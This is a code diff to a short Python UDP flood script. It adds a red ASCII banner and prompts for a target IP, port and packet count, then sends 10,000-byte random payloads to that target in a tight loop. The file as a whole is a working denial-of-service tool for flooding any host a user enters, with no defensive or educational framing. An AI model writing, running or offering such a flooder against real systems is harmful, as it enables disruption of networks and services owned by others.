@@ -1,15 +1,36 @@
 import socket
 import random
 import time
+from termcolor import colored
+
+text = colored('''
+██╗   ██╗██████╗ ██╗
+██║   ██║██╔══██╗██║
+██║   ██║██████╔╝██║
+╚██╗ ██╔╝██╔══██╗██║
+ ╚████╔╝ ██║  ██║██║
+  ╚═══╝  ╚═╝  ╚═╝╚═╝
+
+''', 'red', 
+
+)
+
+print(text)
+
+
+
+
+
 
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-ip = "192.168.1.164"
-port = int("8080")
-sleep = float("0")
+ip = input("Target IP: ")
+port = int(input("Target Port: "))
+los = int(input("Nuber of packets: "))
+sleep = 0
 
-s.connect((ip, port))
+s.connect((ip, port))   
 
-for i in range(1, 100 * 10000):
+for i in range(1, los):
   s.send(random._urandom(10) * 1000)
   print(f"Send: {i}", end='\r')
   time.sleep(sleep)
